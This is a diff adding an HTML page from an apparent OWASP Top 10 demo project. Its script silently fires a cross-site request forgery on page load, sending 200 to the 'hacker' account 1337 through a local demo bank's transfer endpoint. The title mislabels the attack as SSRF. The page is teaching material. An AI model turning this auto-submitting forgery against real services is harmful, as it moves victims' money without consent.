@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Send money to 1337</title>
+</head>
+<body>
+    <!-- 1337 is hacker id -->
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://localhost/top10-owasp-demo/cross-site-request-forgery/bank/tranfer-money.php?amount=200&to=1337", true);
+        xhr.send();
+    </script>
+</body>
+</html>
